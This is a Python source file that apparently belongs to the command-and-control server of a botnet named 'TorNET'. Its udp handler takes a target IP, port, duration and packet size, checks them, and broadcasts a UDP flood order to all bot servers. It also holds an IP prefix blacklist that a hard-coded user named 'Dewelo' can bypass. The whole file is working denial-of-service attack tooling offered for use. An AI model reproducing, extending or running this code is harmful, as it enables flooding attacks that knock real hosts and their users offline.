from colorama import Fore

blacklist = ["83.25.42", "83.25.43",  "46.134",  "31.60",  "23.227",  "45.250",  "38.84.",  "38.68"]

def udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data, username):
        if len(args) == 5:
            ip = args[1]
            port = args[2]
            secs = args[3]
            size = args[4]
            if blacklistCheck(ip) or ip in blacklist or username == "Dewelo":
                if validate_ip(ip):
                    if validate_port(port, True):
                        if validate_time(secs):
                            if validate_size(size):
                                send(client, f"{Fore.LIGHTWHITE_EX}Attack successfully sent to all {Fore.RED}TorNET {Fore.LIGHTWHITE_EX}servers!")
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                        else:
                            send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                    else:
                        send(client, Fore.RED + 'Invalid port number (1-65535)')
                else:
                    send(client, Fore.RED + 'Invalid IP-address')
            else:
                send(client, Fore.RED + 'This IP is on blacklist!')
        else:
            send(client, 'Usage: !udp [IP] [PORT] [TIME] [SIZE]')
            send(client, 'Use port 0 for random port mode')



def blacklistCheck(ip):
    if not ip.startswith(tuple(blacklist)):
        return True

    return False

